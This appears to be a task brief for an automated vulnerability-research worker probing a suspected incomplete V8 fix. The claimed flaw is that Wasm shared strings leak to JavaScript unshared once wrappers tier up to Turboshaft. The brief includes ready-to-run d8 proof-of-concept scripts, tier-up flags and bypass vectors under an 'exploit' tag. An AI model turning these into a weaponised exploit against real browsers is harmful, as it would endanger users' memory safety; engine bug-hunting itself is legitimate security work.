# Genome 041 — shared-string-leak-exploit

## Hypothesis
WASM-TC-003 fix commit 64b77c7889e is CONFIRMED INCOMPLETE by previous worker (post 8f9c940f). The Turboshaft compiled wrapper at wrappers-inl.h:138 uses `IsSubtypeOf(type, kWasmSharedExternRef)` — a static type check. This misses shared strings with types `(ref shared any)`, `(ref shared eq)`, etc. After wrapper tier-up from generic Torque → compiled Turboshaft, shared strings leak to JS unshared.

The Torque generic wrapper (js-to-wasm.tq:881) correctly uses runtime checks: `Is<String>(value) && InSharedSpace(...)`. But after tier-up (controlled by `--wasm-wrapper-tiering-budget`), the compiled wrapper takes over and uses the weaker static check.

## DNA

### Gap: wrappers-inl.h:138
```cpp
if (IsSubtypeOf(type, kWasmSharedExternRef)) {  // ONLY checks externref subtypes
    // ... unshare string ...
}
// Types like (ref shared any) fall through WITHOUT unsharing
```

### Fix already applied: js-to-wasm.tq:881
```torque
if (Is<String>(value) && InSharedSpace(UnsafeCast<String>(value))) {
    return runtime::WasmWasmToJSObject(context, value);  // Correct: runtime check
}
```

### Bypass Vectors (from post 8f9c940f)
1. `(ref shared any)` via `any.convert_extern` — isShared=true LEAK ✗
2. Struct field with anyref type — isShared=true LEAK ✗
3. Array element with anyref type — isShared=true LEAK ✗
4. Multi-convert chains — LEAK ✗

### Tier-Up Control
- `--wasm-wrapper-tiering-budget=N` — lower N forces faster tier-up
- Default budget is high; use `--wasm-wrapper-tiering-budget=1` to force immediate tier-up

## Ready-to-Run Test

**IMPORTANT: Run this test FIRST before any source reading. Post the result immediately.**

Save as `test_shared_string_leak.js` and run with:
```bash
/Users/t/v8/out/fuzzbuild/d8 --experimental-wasm-shared --allow-natives-syntax test_shared_string_leak.js
```

```javascript
// Test: shared string leak via anyref return after wrapper tier-up
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

let builder = new WasmModuleBuilder();

// Shared type: (ref shared null any)
let kSharedRefAny = wasmRefNullType(kWasmAnyRef).shared();
let kSharedRefExtern = wasmRefType(kWasmExternRef).shared();

// Shared global holding a shared string
let global_idx = builder.addImportedGlobal("m", "g", kSharedRefAny, false);

// Function 1: returns shared anyref (the gap path)
builder.addFunction("get_anyref", makeSig([], [kSharedRefAny]))
  .addBody([kExprGlobalGet, global_idx])
  .exportFunc();

// Function 2: returns shared externref (the fixed path)
builder.addFunction("get_externref", makeSig([], [kSharedRefExtern]))
  .addBody([kExprGlobalGet, global_idx, kGCPrefix, kExprAnyConvertExtern])
  .exportFunc();

let instance;
try {
  instance = builder.instantiate({m: {g: "hello"}});
} catch(e) {
  print("Instantiation error: " + e);
  // Try alternative: pass shared string via different mechanism
}

if (instance) {
  // Before tier-up: generic Torque wrapper handles conversion
  let result1 = instance.exports.get_anyref();
  print("Before tier-up (anyref): " + typeof result1 + " = " + result1);

  // Force tier-up by calling many times
  for (let i = 0; i < 100; i++) {
    instance.exports.get_anyref();
    instance.exports.get_externref();
  }

  // After tier-up: compiled Turboshaft wrapper
  let result2 = instance.exports.get_anyref();
  let result3 = instance.exports.get_externref();
  print("After tier-up (anyref): " + typeof result2 + " = " + result2);
  print("After tier-up (externref): " + typeof result3 + " = " + result3);

  // Check if strings are the same object (shared leak detection)
  print("anyref === anyref: " + (result1 === result2));

  // Try to detect shared-ness via %IsSharedString if available
  try {
    print("result1 isShared: " + %IsSharedString(result1));
    print("result2 isShared: " + %IsSharedString(result2));
    print("result3 isShared: " + %IsSharedString(result3));
  } catch(e) {
    print("Cannot check isShared: " + e);
  }
}
```

Also try with forced tier-up:
```bash
/Users/t/v8/out/fuzzbuild/d8 --experimental-wasm-shared --allow-natives-syntax --wasm-wrapper-tiering-budget=1 test_shared_string_leak.js
```

And try this alternative approach using struct.get:
```javascript
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");
let builder = new WasmModuleBuilder();
let kSharedRefAny = wasmRefNullType(kWasmAnyRef).shared();
let struct_type = builder.addStruct({
  fields: [makeField(kSharedRefAny, true)],
  shared: true
});
let kSharedRefExtern = wasmRefType(kWasmExternRef).shared();

// Global holding the struct
builder.addFunction("make_struct", makeSig([kSharedRefExtern], [wasmRefType(struct_type)]))
  .addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprExternConvertAny,
    kGCPrefix, kExprStructNew, struct_type
  ])
  .exportFunc();

builder.addFunction("get_field", makeSig([wasmRefType(struct_type)], [kSharedRefAny]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructGet, struct_type, 0])
  .exportFunc();

let instance = builder.instantiate();
let s = instance.exports.make_struct("test_string");
// Call many times to trigger tier-up
for (let i = 0; i < 100; i++) instance.exports.get_field(s);
let result = instance.exports.get_field(s);
print("struct.get result: " + typeof result + " = " + result);
try { print("isShared: " + %IsSharedString(result)); } catch(e) {}
```

## Techniques That Work
1. Run the ready-to-run tests above IMMEDIATELY
2. Check %IsSharedString on results
3. Compare results before/after tier-up with `--wasm-wrapper-tiering-budget=1`
4. If instantiation fails, debug the module builder API (check if .shared() method exists)
5. Try `--no-wasm-wrapper-tiering` to disable tier-up as control

## DO NOT Try These
- (ref shared extern) direct returns — FIXED
- Torque generic wrapper path — FIXED
- C++ runtime path — FIXED
- Source reading before running tests — run tests FIRST

## Evolution Plan
- v1: **Run tests, post results**. Execute both test scripts. Post the output immediately with [test_result] tag. If tests crash or error, debug and fix the test code.
- v2: **Tier-up differential**. Compare: `--no-wasm-wrapper-tiering` (always generic) vs `--wasm-wrapper-tiering-budget=1` (immediate tier-up). If results differ, that's the differential.
- v3: **Struct.get and array.get paths**. Test shared strings accessed through struct fields and array elements with anyref types.

## Task
**RUN THE TESTS FIRST.** Do NOT start with source reading. Execute the test scripts, collect output, and post immediately. Then analyze and iterate.

Post with tags `shared-string,turboshaft,wrapper,tier-up,tc-003-exploit,test-result`.
